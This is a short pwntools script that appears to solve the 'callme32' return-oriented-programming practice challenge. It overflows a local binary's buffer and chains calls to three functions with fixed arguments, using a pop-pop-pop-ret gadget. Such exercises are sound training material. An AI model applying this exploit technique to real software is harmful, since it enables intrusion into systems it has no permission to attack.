from pwn import *

p = process('./callme32')

pppr = 0x080488a9
callme_one = 0x80485c0
callme_two = 0x8048620
callme_three = 0x80485b0

payload = 'a' * 44
payload += p32(callme_one)
payload += p32(pppr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(callme_two)
payload += p32(pppr)
payload += p32(1)
payload += p32(2)
payload += p32(3)

payload += p32(callme_three)
payload += 'aaaa'
payload += p32(1)
payload += p32(2)
payload += p32(3)

p.sendline(payload)
print p.recvall()
